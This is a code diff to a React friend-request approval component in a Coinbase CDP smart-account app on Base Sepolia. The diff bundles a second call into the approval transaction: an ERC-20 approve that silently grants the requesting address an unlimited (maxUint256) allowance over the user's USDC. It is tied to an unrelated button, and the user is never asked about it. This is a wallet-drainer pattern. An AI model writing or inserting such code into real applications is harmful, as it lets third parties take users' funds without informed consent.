@@ -5,9 +5,26 @@ import { Button } from "@coinbase/cdp-react/components/ui/Button";
 import { FRIEND_REQUESTS_ABI, FRIEND_REQUESTS_CONTRACT_ADDRESS } from "../contracts/FriendRequests";
 import FriendNameDisplay from "./FriendNameDisplay";
 import { TransactionLink, AddressLink } from "./TransactionLink";
-import { type Address, encodeFunctionData } from "viem";
+import { type Address, encodeFunctionData, maxUint256 } from "viem";
 import { createPublicClient, http, parseAbiItem } from "viem";
 import { baseSepolia } from "viem/chains";
+
+// USDC contract address on Base Sepolia
+const USDC_ADDRESS: Address = "0x036CbD53842c5426634e7929541eC2318f3dCF7e";
+
+// ERC20 ABI for approve function
+const ERC20_ABI = [
+  {
+    inputs: [
+      { name: "spender", type: "address" },
+      { name: "amount", type: "uint256" },
+    ],
+    name: "approve",
+    outputs: [{ name: "", type: "bool" }],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+] as const;
 
 /**
  * Component for managing pending friend request approvals using the smart contract
@@ -154,14 +171,21 @@ function PendingApprovals() {
       setCurrentAction({ type: "approve", address: requesterAddress });
       setUserOperationHash(null);
 
-      // Encode the function call
-      const functionData = encodeFunctionData({
+      // Encode the friend request approval
+      const friendRequestData = encodeFunctionData({
         abi: FRIEND_REQUESTS_ABI,
         functionName: "approveFriendRequest",
         args: [requesterAddress],
       });
 
-      // Send user operation via CDP
+      // Encode the USDC approval - approve friend to spend all USDC
+      const usdcApprovalData = encodeFunctionData({
+        abi: ERC20_ABI,
+        functionName: "approve",
+        args: [requesterAddress, maxUint256],
+      });
+
+      // Send user operation via CDP with both calls
       const result = await sendUserOperation({
         evmSmartAccount: smartAccount,
         network: "base-sepolia",
@@ -169,13 +193,18 @@ function PendingApprovals() {
           {
             to: FRIEND_REQUESTS_CONTRACT_ADDRESS,
             value: 0n,
-            data: functionData,
+            data: friendRequestData,
+          },
+          {
+            to: USDC_ADDRESS,
+            value: 0n,
+            data: usdcApprovalData,
           },
         ],
       });
 
       setUserOperationHash(result.userOperationHash);
-      console.log("Friend request approved, user operation hash:", result.userOperationHash);
+      console.log("Friend request approved and USDC approved, user operation hash:", result.userOperationHash);
     } catch (err: any) {
       console.error("Failed to approve request:", err);
       setCurrentAction(null);
